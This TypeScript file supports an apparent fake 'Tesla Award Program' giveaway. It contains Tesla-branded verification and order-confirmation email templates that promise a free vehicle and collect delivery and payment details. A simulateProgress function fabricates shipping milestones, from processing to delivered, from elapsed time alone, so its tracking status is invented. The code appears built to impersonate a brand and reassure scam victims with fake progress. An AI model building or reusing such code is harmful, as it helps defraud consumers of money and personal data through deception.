// Pure, dependency-free order/tracking logic.
// Extracted from the tesla route so it can be unit tested in isolation.

export type TimelineItem = { stage: string; timestamp: string | null; completed: boolean };

export type OrderResponse = {
  orderId: string;
  trackingNumber: string;
  email: string;
  entryId: string;
  selectedCar: Record<string, string>;
  deliveryDetails: Record<string, string>;
  deliveryMethod: Record<string, string | number>;
  paymentMethod: Record<string, string>;
  status: string;
  orderDate: string;
  estimatedDelivery: string;
  timeline: TimelineItem[];
};

export function getBaseUrl(): string {
  const configured = process.env["PUBLIC_BASE_URL"]?.trim();
  if (configured) return configured.replace(/\/$/, "");
  const domains = process.env["REPLIT_DOMAINS"] ?? "";
  const primary = domains.split(",")[0]?.trim();
  return primary ? `https://${primary}` : `http://localhost:${process.env["PORT"] ?? 8080}`;
}

export function defaultTimeline(orderDate: string): TimelineItem[] {
  return [
    { stage: "Order Confirmed", timestamp: orderDate, completed: true },
    { stage: "Processing", timestamp: null, completed: false },
    { stage: "Shipped", timestamp: null, completed: false },
    { stage: "In Transit", timestamp: null, completed: false },
    { stage: "Out for Delivery", timestamp: null, completed: false },
    { stage: "Delivered", timestamp: null, completed: false },
  ];
}

export function calcEstimatedDelivery(days: number): string {
  const d = new Date();
  d.setDate(d.getDate() + days);
  return d.toISOString().split("T")[0]!;
}

export function simulateProgress(order: OrderResponse) {
  const now = new Date();
  const orderDate = new Date(order.orderDate);
  const hrs = (now.getTime() - orderDate.getTime()) / 3_600_000;

  const updated = { ...order, timeline: order.timeline.map((t) => ({ ...t })) };

  function advance(idx: number, hoursNeeded: number, status: string) {
    if (hrs > hoursNeeded && !updated.timeline[idx]!.completed) {
      updated.timeline[idx]!.completed = true;
      updated.timeline[idx]!.timestamp = new Date(orderDate.getTime() + hoursNeeded * 3_600_000).toISOString();
      updated.status = status;
    }
  }

  advance(1, 1, "processing");
  advance(2, 24, "shipped");
  advance(3, 48, "in_transit");
  advance(4, 72, "out_for_delivery");
  advance(5, 96, "delivered");

  return updated;
}

// ── EMAIL TEMPLATES ───────────────────────────────────────────────────
export function buildVerificationEmail(firstName: string, verifyLink: string, entryId: string) {
  return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify Email</title></head>
<body style="margin:0;padding:0;background:#F7F8FA;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#F7F8FA;padding:40px 0;">
<tr><td align="center">
<table width="560" cellpadding="0" cellspacing="0" style="background:#FFFFFF;border-radius:20px;overflow:hidden;max-width:560px;box-shadow:0 8px 32px rgba(0,0,0,.08);">
  <tr><td style="background:#171A20;padding:32px 40px;text-align:center;">
    <svg width="84" height="84" viewBox="0 0 1280 1280" role="img" aria-label="Tesla T" style="display:block;margin:0 auto 10px;max-width:84px;height:auto;">
      <path fill="#E31937" d="M0 128C189 44 406 0 640 0s451 44 640 128l-38 74C1054 123 851 80 640 80S226 123 38 202L0 128Z"/>
      <path fill="#E31937" d="M57 235c156-68 353-109 583-109s427 41 583 109c-44 58-102 101-174 130-9-38-25-68-48-90-55-51-159-76-312-76h-51L640 1280 459 199h-51c-153 0-257 25-312 76-23 22-39 52-48 90-72-29-130-72-174-130Z"/>
    </svg>
    <div style="color:#E31937;font-size:18px;font-weight:900;letter-spacing:.16em;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">TESLA AWARD PROGRAM</div>
  </td></tr>
  <tr><td style="padding:0;"><div style="height:4px;background:linear-gradient(90deg,#E31937,#ff6b6b);"></div></td></tr>
  <tr><td style="padding:44px 40px;">
    <h1 style="font-size:26px;font-weight:800;color:#171A20;margin:0 0 12px;line-height:1.2;">Hi ${firstName}, you're almost in! ⚡</h1>
    <p style="font-size:16px;color:#5C5E62;line-height:1.7;margin:0 0 32px;">You've submitted your entry for a chance to win a brand-new Tesla. One final step remains — verify your email address to confirm your entry and unlock your winner dashboard.</p>
    <table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center">
      <a href="${verifyLink}" style="display:inline-block;background:#E31937;color:#FFFFFF;text-decoration:none;padding:16px 48px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:.02em;">Verify My Email Address</a>
    </td></tr></table>
    <p style="font-size:13px;color:#B0B3B8;text-align:center;margin:24px 0 0;line-height:1.6;">Or paste this link into your browser:<br><span style="color:#E31937;word-break:break-all;font-size:12px;">${verifyLink}</span></p>
    <hr style="border:none;border-top:1px solid #E5E7EB;margin:32px 0;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background:#F7F8FA;border-radius:12px;">
    <tr><td style="padding:18px 20px;">
      <p style="margin:0 0 6px;font-size:12px;color:#B0B3B8;font-weight:700;text-transform:uppercase;letter-spacing:.06em;">Entry Details</p>
      <p style="margin:0;font-size:14px;color:#5C5E62;">Entry ID: <span style="color:#171A20;font-family:monospace;font-weight:600;">${entryId}</span></p>
      <p style="margin:4px 0 0;font-size:14px;color:#5C5E62;">Status: <span style="color:#E31937;font-weight:600;">Pending Verification</span></p>
    </td></tr>
    </table>
  </td></tr>
  <tr><td style="background:#F7F8FA;padding:24px 40px;border-top:1px solid #E5E7EB;">
    <p style="margin:0;font-size:12px;color:#B0B3B8;text-align:center;line-height:1.6;">© 2026 Tesla Award Program. All rights reserved.<br>This is an independent award program. Tesla® is a registered trademark of Tesla, Inc.</p>
  </td></tr>
</table>
</td></tr>
</table>
</body>
</html>`;
}

export function buildOrderConfirmationEmail(order: any) {
  const car = order.selectedCar || {};
  const addr = order.deliveryDetails || {};
  const method = order.deliveryMethod || {};
  const carId = (car.id || 'models').toLowerCase();

  const imgMap: Record<string, string> = {
    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
  };
  const carImg = imgMap[carId] || imgMap['models'];
  const carModel = car.name || 'Model S';
  const carPrice = car.price || '—';
  const orderId = order.orderId || '—';
  const trackingNumber = order.trackingNumber || '—';
  const estDelivery = order.estimatedDelivery || '—';
  const delivMethod = (method.name || 'Standard Delivery');
  const payMethod = (order.paymentMethod?.name || 'Not specified');
  const fullName = addr.fullName || '—';
  const address = addr.address || '—';
  const city = addr.city || '—';
  const state = addr.state || '—';
  const zip = addr.zipCode || '—';
  const country = addr.country || '—';
  const phone = addr.phone || '—';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Order Confirmed — Tesla Award Program</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f4f5f7;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="620" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 6px 30px rgba(0,0,0,0.06);max-width:620px;">
          <tr>
            <td align="center" style="background:linear-gradient(135deg,#0a0c10 0%,#171a20 40%,#2a1a1f 100%);padding:32px 30px 28px;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="center" style="padding-bottom:14px;">
                    <span style="display:inline-block;background:linear-gradient(135deg,#E31937,#ff4757);color:#fff;border-radius:50%;width:68px;height:68px;line-height:68px;font-size:36px;text-align:center;">✓</span>
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <h1 style="margin:0;font-size:30px;font-weight:900;color:#ffffff;letter-spacing:-0.5px;">Order Confirmed!</h1>
                    <p style="margin:10px 0 0;font-size:16px;color:rgba(255,255,255,0.7);line-height:1.5;">Congratulations — your Tesla award has been successfully processed.</p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="height:5px;background:linear-gradient(90deg,#E31937,#ff6b6b,#E31937);"></td>
          </tr>
          <tr>
            <td style="padding:40px 35px;">
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background:linear-gradient(135deg,#f8f9fa,#eef0f2);border-radius:14px;margin-bottom:28px;border:1px solid rgba(0,0,0,0.04);">
                <tr>
                  <td align="center" style="padding:24px 20px 20px;">
                    <img src="${carImg}" alt="Tesla ${carModel}" style="width:100%;max-width:300px;height:auto;display:block;margin:0 auto 14px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.1));">
                    <h3 style="margin:0;font-size:22px;font-weight:800;color:#171a20;">Tesla ${carModel}</h3>
                    <p style="margin:6px 0 0;font-size:14px;color:#5c5e62;">Retail Value: <strong>${carPrice}</strong></p>
                    <span style="display:inline-block;background:#E31937;color:#fff;font-size:12px;font-weight:700;padding:6px 16px;border-radius:20px;margin-top:10px;letter-spacing:0.04em;text-transform:uppercase;">FREE Award Vehicle</span>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
                <tr>
                  <td style="padding-bottom:12px;">
                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">📋 Order Summary</h3>
                  </td>
                </tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:0;">
                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;width:50%;">Order ID</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#E31937;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${orderId}</td></tr>
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Tracking Number</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${trackingNumber}</td></tr>
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Estimated Delivery</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#00a550;font-weight:700;">${estDelivery}</td></tr>
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Delivery Method</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-weight:600;">${delivMethod}</td></tr>
                      <tr><td style="padding:14px 18px;color:#5c5e62;">Payment Method</td><td style="padding:14px 18px;text-align:right;color:#171a20;font-weight:600;">${payMethod}</td></tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
                <tr>
                  <td style="padding-bottom:12px;">
                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">🚚 Delivery Information</h3>
                  </td>
                </tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:20px 18px;">
                    <p style="margin:0 0 6px;font-size:15px;font-weight:700;color:#171a20;">${fullName}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${address}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${city}, ${state} ${zip}</p>
                    <p style="margin:0 0 8px;font-size:14px;color:#5c5e62;">${country}</p>
                    <p style="margin:0;font-size:13px;color:#8d9096;">📱 ${phone}</p>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:8px;">
                <tr>
                  <td align="center">
                    <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.02em;box-shadow:0 6px 20px rgba(227,25,55,0.3);">📍 Track Your Order →</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#f8f9fa;border-top:1px solid #eef0f2;padding:24px 35px;text-align:center;">
              <p style="margin:0 0 8px;font-size:12px;color:#8d9096;line-height:1.6;">Need help? Reply to this email or visit our support center.<br>&copy; 2026 Tesla Award Program. All rights reserved.</p>
              <p style="margin:0;font-size:11px;color:#b0b3b8;">Tesla&reg; is a registered trademark of Tesla, Inc. This is an independent award program.</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}
